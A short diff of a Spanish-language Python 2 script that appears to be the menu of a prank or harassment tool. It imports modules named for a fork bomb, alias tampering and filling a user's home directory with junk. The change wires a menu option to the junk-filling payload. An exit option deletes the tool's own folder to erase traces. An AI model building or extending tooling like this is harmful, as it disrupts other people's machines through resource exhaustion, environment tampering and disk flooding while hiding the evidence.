@@ -2,6 +2,7 @@ import os
 import bombaFork
 import cambiaAlias
 import cagetizador
+import llenaHomeDeBasura
 
 os.system('clear')
 
@@ -29,7 +30,8 @@ while not salir:
     elif opcion == 4:
         print 'Ejecuta Trolling'
     elif opcion == 5:
-        print 'Ejecuta llenar home de basura'
+        print 'frases chorras are commig'
+        llenaHomeDeBasura.llenaHome()
     elif opcion == 99:
         print "Saliendo... y borrando rastro"
         shutil.rmtree('../Puteador')
